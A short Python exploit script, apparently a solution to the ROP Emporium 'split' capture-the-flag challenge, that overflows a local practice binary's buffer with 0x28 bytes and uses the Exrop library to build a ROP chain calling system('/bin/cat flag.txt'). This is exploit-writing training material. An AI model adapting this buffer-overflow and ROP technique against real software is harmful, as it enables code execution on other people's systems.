from pwn import *
from Exrop import Exrop

binname = "./split"
p = process(binname)
elf = ELF(binname)
catflag = next(elf.search(b"/bin/cat flag.txt"))
system = elf.symbols['system']
rop = Exrop(binname)
rop.find_gadgets(cache=True)
chain = rop.func_call(system, (catflag, 0))
chain.dump()
buf = b"A"*0x28
pay = buf + chain.payload_str()
p.sendlineafter("> ", pay)
p.interactive()
